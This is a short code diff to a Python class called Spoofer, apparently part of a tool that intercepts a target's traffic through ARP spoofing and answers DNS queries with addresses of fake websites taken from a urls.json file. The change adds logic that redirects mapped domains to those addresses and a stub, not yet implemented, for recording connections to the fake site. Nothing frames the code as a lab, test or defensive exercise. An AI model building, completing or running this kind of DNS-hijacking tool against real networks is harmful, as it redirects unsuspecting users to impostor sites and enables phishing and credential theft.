@@ -74,7 +74,11 @@ class Spoofer:
             dns_layer = packet[DNS]
             domain: str = dns_layer.qd.qname.decode() # Retrieve domain.
             urls: dict[str,str] = self.get_urls()
-            ip_response = self.nslookup(urls.get(domain,domain))
+            if domain in urls.keys():
+                ip_response = self.nslookup(urls[domain])
+                self.register(domain,packet)
+            else:
+                ip_response = self.nslookup(domain)
             self.send_dns_response(ip_response,packet)
     
     def forward_to_router(self):
@@ -86,6 +90,14 @@ class Spoofer:
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
         # Dump all corresponding packets into process_packet to handle.
 
+    
+    def register(self,fake_url,packet):
+        """
+        register connection to fake website. not the IP, and such.
+        """
+        raise NotImplementedError
+    
+    
     def get_urls(self) -> dict[str,str]:
         """
         return url dict, from urls.json
